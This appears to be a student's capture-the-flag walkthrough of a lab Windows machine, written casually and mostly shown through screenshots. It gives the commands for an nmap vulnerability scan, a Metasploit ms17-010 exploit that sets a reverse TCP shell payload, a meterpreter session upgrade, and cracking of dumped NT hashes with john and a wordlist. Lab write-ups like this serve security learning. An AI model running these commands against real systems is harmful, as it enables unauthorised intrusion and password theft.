# Tasks

1. [**Recon**](#recon)
2. [**Gain Access**](#gain-access)
3. [**Escalate**](#escalate)
4. [**Cracking**](#cracking)
5. [**Find flags!**](#find-flags!)

# Recon

## Problems and Answers

![image](https://github.com/user-attachments/assets/de0fc226-2fc2-4bd5-903b-e09d93adf425)

## Solution

**Default scan:**

![image](https://github.com/user-attachments/assets/5ac5ef4e-f122-41d9-9661-2e659ce8958e)

**Vuln script scan:**

![image](https://github.com/user-attachments/assets/34a877cd-1049-45e7-858c-27aede5444a7)

**Note:** Could probably use _Nessus_ to find the CVE, but the _vuln script_ in **nmap** was more convenient for me lmao

Btw, here's how it looks:

```
nmap -sV --script vuln [IP Address]
```

# Gain Access

## Problems and Answers

![image](https://github.com/user-attachments/assets/ca14971c-8428-45f2-8c3d-e7c70cca0d1b)

## Solution

![image](https://github.com/user-attachments/assets/37d6a0b5-9ece-4424-bff8-3d98a72b3657)

![image](https://github.com/user-attachments/assets/89250fd8-e47d-42b7-ae68-f9d3e174f306)

Summary of **msfconsole** commands:

```
search ms17-010
use [exploit file path]
show options
set RHOSTS [Target IP]
set LHOST [Host IP]
set payload windows/x64/shell/reverse_tcp // Just for learning purposes so we know how to make our own meterpreter shell if need be
exploit
```

# Escalate

## Problems and Answers

![image](https://github.com/user-attachments/assets/6ea806b9-033d-483e-985f-fcd6496e959c)

## Solution

Got told to search myself how to upgrade a session into a meterpreter shell, so...

[**Upgrading shells to Meterpreter - Metasploit**](https://docs.metasploit.com/docs/pentesting/metasploit-guide-upgrading-shells-to-meterpreter.html)

[**Shell to Meterpreter Upgrade - Metasploit**](https://www.infosecmatter.com/metasploit-module-library/?mm=post/multi/manage/shell_to_meterpreter)

Anyways, we found that out, so moving on

**Using the meterpreter upgrade:**

![image](https://github.com/user-attachments/assets/0fa5277f-0222-4703-ae21-79b558afc508)

It stopped a bunch of times btw lmao

Also here, so you don't forget how to use a _session_ next time:

```
sessions -i [ID Number]
```

Anyways, here's the rest of the steps according to the instructions:

![image](https://github.com/user-attachments/assets/407e2353-ea04-46fb-8e14-b95fa4c69584)

![image](https://github.com/user-attachments/assets/5e71b944-e4c6-41f6-a8aa-47435bfd4846)

**Note:** It's a lot of processes dw abt it

![image](https://github.com/user-attachments/assets/15905b60-85b5-46ed-b7a7-4d9c3fabcef1)

# Cracking

## Problems and Answers

![image](https://github.com/user-attachments/assets/b30e7538-794d-4fb9-a3a5-2d7a7c52292e)

## Solution

Get them hashes:

![image](https://github.com/user-attachments/assets/fa4a3e12-701a-4909-ad99-df848e7c722d)

Now, it's time for **hash cracking**

Now normally, I would run this:

```
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt [Hash File]
```

But for some goofy ahh reason, my john isn't working ://

So we resort to an online NTLM Hash Cracker

![image](https://github.com/user-attachments/assets/17079134-8e5b-4832-9315-7c178759adcf)

P.S. Still salty af abt john not working

# Find flags!

## Problems and Answers

![image](https://github.com/user-attachments/assets/093d4743-94e2-45d0-976c-bb902eadf00a)

## Solution

**Flag 1:**

![image](https://github.com/user-attachments/assets/9688f047-8f4e-49da-9d45-ef26b514b0ca)

**Flag 2:**

![image](https://github.com/user-attachments/assets/9c92a0fc-0f3d-4092-8e37-8cd31526f85a)

**Flag 3:**

![image](https://github.com/user-attachments/assets/1548f405-3eb4-45f9-89c8-cb0507988c65)

